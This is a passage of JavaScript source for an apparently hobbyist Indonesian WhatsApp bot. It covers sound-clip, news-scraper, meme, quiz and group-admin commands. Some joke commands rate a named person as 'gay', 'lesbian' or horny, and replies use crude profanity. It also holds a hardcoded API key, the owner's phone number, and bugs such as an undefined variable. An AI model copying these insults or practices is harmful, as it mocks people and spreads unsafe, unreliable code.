 haikal.sendMessage(m.chat, {audio: miki, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'musik': {
if (isBan) throw sticBanLu(from)
 mo = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: mo, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'mastah': {
if (isBan) throw sticBanLu(from)
 mu = fs.readFileSync('./baseikal/sound/mastah.mp3')
 haikal.sendMessage(m.chat, {audio: mu, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'slebeyatfw': {
if (isBan) throw sticBanLu(from)
 me = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: me, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'cantik': {
if (isBan) throw sticBanLu(from)
 muku = fs.readFileSync('./baseikal/sound/loli.mp3')
 haikal.sendMessage(m.chat, {audio: muku, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'kesel': {
if (isBan) throw sticBanLu(from)
 meke = fs.readFileSync('./baseikal/sound/kesel.mp3')
 haikal.sendMessage(m.chat, {audio: meke, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'ngeselin': {
if (isBan) throw sticBanLu(from)
 moko = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
 haikal.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
//=================================================//
case 'once': case 'toonce': { 
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: hw })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: hw })
}
}
break
//=================================================//
//=================================================//
case 'translate': case 'terjemahan': case 'tr': {
if (isBan) throw sticBanLu(from)
if (!args.join(" ")) return m.reply("Text?")
tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
Infoo = tes.info
Detek = tes.translate
m.reply(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
}
break
//=================================================//
case 'bully': case 'waifu': case 'cuddle': case 'neko': case 'cry': case 'kiss': case 'hug': case 'awoo': case 'lick': {
if (isBan) throw sticBanLu(from)
let anu = await getBuffer(`https://yx-api.herokuapp.com/api/sfw/${command}`)
haikal.sendMessage(m.chat, { image: anu, caption: `NihKak` }, { quoted: m})
}
break
//=================================================//
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (isBan) throw sticBanLu(from)
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
haikal.sendImage(m.chat, data.url, mess.success, m)
})
break
//=================================================//
//=================================================//
case 'darkjoke':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/asupan/darkjoke?APIKEY=apivproject`)
haikal.sendMessage(m.chat, { image: anu, caption: `Beliau ini....` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'meme':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme?APIKEY=apivproject`)
haikal.sendMessage(m.chat, { image: anu, caption: `Bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'meme2':{
if (isBan) throw sticBanLu(from)
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme2?APIKEY=apivproject`)
haikal.sendMessage(m.chat, { image: anu, caption: `bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'ss': case 'ssweb': {
if (isBan) throw sticBanLu(from)

////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(mess.endLimit)
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
haikal.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted: m }).catch((err) => m.reply(jsonformat('*error*')))
}
break
//=================================================//
case 'fajar-news':
if (isBan) throw sticBanLu(from)

FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case "quotes":
if (isBan) throw sticBanLu(from)

var res = await Quotes()
teks += `\nAuthor: ${res.author}\n`
teks += `\nQuotes:\n`
teks += `${res.quotes}\n`
teks += ""
reply(teks)
break
//=================================================//
case "darkjoke": case "darkjokes":
if (isBan) throw sticBanLu(from)

var res = await Darkjokes()
teks = "*Darkjokes*"
haikal.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : hw })
break
//=================================================//
case 'cnn-news':
if (isBan) throw sticBanLu(from)

CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'layarkaca-search':
if (isBan) throw sticBanLu(from)

if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
break
//=================================================//
case 'cnbc-news':
if (isBan) throw sticBanLu(from)

CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'tribun-news':
if (isBan) throw sticBanLu(from)

TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'indozone-news':
if (isBan) throw sticBanLu(from)

IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'kompas-news':
if (isBan) throw sticBanLu(from)

KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'detik-news':
if (isBan) throw sticBanLu(from)

DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'daily-news':
if (isBan) throw sticBanLu(from)

DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'inews-news':
if (isBan) throw sticBanLu(from)

iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'okezone-news':
if (isBan) throw sticBanLu(from)

OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'sindo-news':
if (isBan) throw sticBanLu(from)

SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'tempo-news':
if (isBan) throw sticBanLu(from)

TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'antara-news':
if (isBan) throw sticBanLu(from)

AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case "kontan-news":
if (isBan) throw sticBanLu(from)

KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case "merdeka-news":
if (isBan) throw sticBanLu(from)

MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case "jalantikus-meme":
if (isBan) throw sticBanLu(from)

var res = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${res}`
teks += ""
haikal.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : hw })
break
//=================================================//
/*Random*/
 case 'apakah':
 if (isBan) throw sticBanLu(from)

if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya haikal`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: hw })
break
//=================================================//
case 'bisakah':
if (isBan) throw sticBanLu(from)

if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya haikal`)
const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: hw })
break
//=================================================//
case 'bagaimanakah':
if (isBan) throw sticBanLu(from)

if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya haikal`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: hw })
break
//=================================================//
case 'rate':
if (isBan) throw sticBanLu(from)

if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const te = ra[Math.floor(Math.random() * ra.length)]
haikal.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: hw })
break
//=================================================//
case 'gantengcek':
case 'cekganteng':
if (isBan) throw sticBanLu(from)

if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const teng = gan[Math.floor(Math.random() * gan.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: hw })
break
//=================================================//
case 'cantikcek':
case 'cekcantik':
if (isBan) throw sticBanLu(from)

if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const tik = can[Math.floor(Math.random() * can.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: hw })
break
//=================================================//
case 'sangecek':
case 'ceksange':
case 'gaycek':
case 'cekgay':
case 'lesbicek':
case 'ceklesbi':
if (isBan) throw sticBanLu(from)

if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: hw })
break
//=================================================//
case 'kapankah':
if (isBan) throw sticBanLu(from)

if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: hw })
break
//=================================================//
case 'wangy':
if (isBan) throw sticBanLu(from)

if (!q) return reply (`Contoh : wangy 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, AAAAH BAUNYA RAMBUT ${qq} WANGYY AKU MAU NYIUMIN AROMA WANGYNYA ${qq} AAAAAAAAH ~ RAMBUTNYA.... AAAH RAMBUTNYA JUGA PENGEN AKU ELUS-ELUS ~~ AAAAAH ${qq} KELUAR PERTAMA KALI DI ANIME JUGA MANIS ❤️ ❤️ ❤️ BANGET AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️APA ? ${QQ} ITU GAK NYATA ? CUMA HALU katamu ? NGGAK, NGAK NGAK NGAK NGAK NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} GW ... ${qq} DI LAPTOP NGELIATIN GW, ${qq} .. KAMU PERCAYA SAMA AKU ? AAAAAAAAAAAH SYUKUR ${q} AKU GAK MAU MERELAKAN ${qq} AAAAAAH ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
 reply(awikwok)
break
//=================================================//
case 'cekmati':
if (isBan) throw sticBanLu(from)

if (!q) return reply(`Invalid!\n\nYg mau di cek siapa kontol?`)
predea = await axios.get(`https://api.agify.io/?name=${q}`)
reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
break
//=================================================//
//=================================================//
case 'delttc': case 'delttt': {
if (isBan) throw sticBanLu(from)

this.game = this.game ? this.game : {}
try {
if (this.game) {
delete this.game
haikal.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
} else if (!this.game) {
reply(`Session TicTacToe🎮 tidak ada`)
} else throw '?'
} catch (e) {
reply('rusak')
}
}
break
//=================================================//
case 'suitpvp': case 'suit': {
if (isBan) throw sticBanLu(from)

this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_
@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit
Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await haikal.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) haikal.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
//=================================================//
case 'dvuayasi': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n⭔ 13k Per Group via E-Walet 1 Month\n⭔ 18k via pulsa 1 Month\n\n Premium Price Bot\n⭔ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6285814480623 (Owner)\n\nDonate For Me : \n\n⭔ Paypal : https://trakteer.id/hw-mods-wa-haikal\n⭔ Saweria : https://saweria.co/hwmodswa` }, { quoted: hw })
}
break
//=================================================//
case 'styuuxssc': {
if (isBan) throw sticBanLu(from)

reply('Telegram : https://t.me/haikal857\n\n Sc Bot : https://youtube.com/c/HwModsWa857')
}
break
//=================================================//
case 'chat': {
if (isBan) throw sticBanLu(from)

if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
if (args[0] === 'mute') {
haikal.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'unmute') {
haikal.chatModify({ mute: null }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'archive') {
haikal.chatModify({archive: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
haikal.chatModify({ archive: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'read') {
haikal.chatModify({ markRead: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'unread') {
haikal.chatModify({ markRead: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'delete') {
haikal.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
}
break
//=================================================//
case 'family100': {
if (isBan) throw sticBanLu(from)

if ('family100'+m.chat in _family100) {
reply('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await haikal.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
break
//=================================================//
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
if (isBan) throw sticBanLu(from)

if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break

//=================================================//
case 'mediafire': {
if (isBan) throw sticBanLu(from)

////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return  
if (!text) throw '*Enter a Link Query!*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*The link you provided is not valid*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return reply('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait zimbot processing..._

*© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲*`
reply(`${result4}`)
haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : hw }).catch ((err) => reply('*Failed to download File*'))
}
break
//=================================================//
case 'kuismath': case 'math': {
if (isBan) throw sticBanLu(from)

if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let { genMath, modes } = require('./baseikal/dbnye/math')
if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
let result = await genMath(text.toLowerCase())
haikal.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
}
}
break
//=================================================//

//=================================================//

//=================================================//
case 'react': {
 reactionMessage = {
react: {
text: '🇮🇩',
key: { remoteJid: from, fromMe: false, id: quoted.id }
}
}
haikal.sendMessage(from, reactionMessage)
}
break
//=================================================//
case 'join': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
await haikal.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'keluar': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

await haikal.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'setexif': {
if (isBan) throw sticBanLu(from)

 if (isBan) throw sticBanLu(from)

 if (!text) throw `Example : ${prefix + command} packname|author`
global.packname = text.split("|")[0]
global.author = text.split("|")[1]
reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
}
break
//=================================================//
case 'kick': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'add': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'block': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'setname': case 'setsubject': {
if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
